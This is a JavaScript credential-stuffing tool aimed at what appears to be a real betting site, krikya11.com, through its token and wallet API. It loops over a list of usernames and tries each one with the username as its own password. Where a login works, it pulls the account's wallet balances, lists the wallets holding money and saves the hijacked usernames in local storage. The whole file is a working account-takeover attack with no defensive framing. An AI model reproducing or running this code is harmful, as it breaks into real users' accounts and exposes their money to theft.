let stopRequested = false;
let successfulLogins = [];

function fetchUsernamesFromProcessedList() {
    const wordListContainer = document.getElementById('wordListContainer');
    const usernames = [];
    if (wordListContainer) {
        wordListContainer.querySelectorAll('.col.border').forEach(div => {
            usernames.push(div.textContent.trim());
        });
    }
    return usernames;
}

async function tryLogin(username) {
    if (stopRequested) return null;

    const loginData = {
        domain: "https://www.krikya11.com",
        membercode: username,
        password: username,
        platform: "desktop",
        option: "2",
    };

    let loginResponse, loginResult;
    try {
        loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(loginData),
        });
        loginResult = await loginResponse.json();
    } catch (error) {
        console.log(`Network error for ${username}:`, error);
        return;
    }

    if (loginResponse.ok) {
        await fetchWalletDetails(loginResult.access_token, username);
    } else {
        console.log(`Login failed: ${username}`);
    }
}
async function fetchWalletDetails(token, username) {
    if (stopRequested) return;

    const response = await fetch(
        "https://feapi.sharky777.xyz/api/member/wallets", {
        method: "GET",
        headers: {
            Authorization: `Bearer ${token}`
        },
    }
    );

    const result = await response.json();
    if (response.ok) {
        const wallets = result.data.wallets.map((wallet) => ({
            code: wallet.wallet_code,
            balance: wallet.balance
        }));
        displaySuccessResponse(username, wallets);

        const tableBody = document.getElementById("tableBody");
        wallets.forEach(wallet => {
            if (parseFloat(wallet.balance) >= 1) {
                const tr = document.createElement('tr');
                // Show balance as integer
                const intBalance = parseInt(wallet.balance, 10);
                tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>৳ ${intBalance}</td>`;
                tableBody.appendChild(tr);
            }
        });

        successfulLogins.push({
            username,
            wallets
        });
    }
}

function displaySuccessResponse(username) {
    successfulLogins.push(username);
    localStorage.setItem('success', successfulLogins.map(u => typeof u === 'string' ? u : u.username).join(','));
    const successOutput = document.getElementById("successOutput");
    const div = document.createElement('div');
    div.classList.add("col");
    div.classList.add("border");
    div.textContent = username;
    successOutput.appendChild(div);
}
function createUserBalanceDiv(username, code, balance) {
    const tableBody = document.getElementById("tableBody");
    // Remove decimals, show as integer
    const intBalance = parseInt(balance, 10);
    const tr = document.createElement('tr');
    tr.innerHTML = `<td>${username}</td><td>${code}</td><td>${intBalance}</td>`;
    tableBody.appendChild(tr);
}

const mainButton = document.getElementById('mainButton');
const stopButton = document.getElementById('stopButton');

mainButton.addEventListener('click', () => {
    processLoginFile()
});

stopButton.addEventListener('click', () => {
    stopLoginAttempts();
});

async function processLoginFile() {
    stopRequested = false;
    successfulLogins = [];
    const usernames = fetchUsernamesFromProcessedList();
    for (const username of usernames) {
        if (stopRequested) {
            console.log("STOPPED");
            alert("STOPPED");
            return;
        }
        try {
            await tryLogin(username);
        } catch (error) {
            console.log(error);
        }
    }
    alert("Login process finished!");
    document.getElementById('loading').style.display="none";
}


function stopLoginAttempts() {
    stopRequested = true;
}
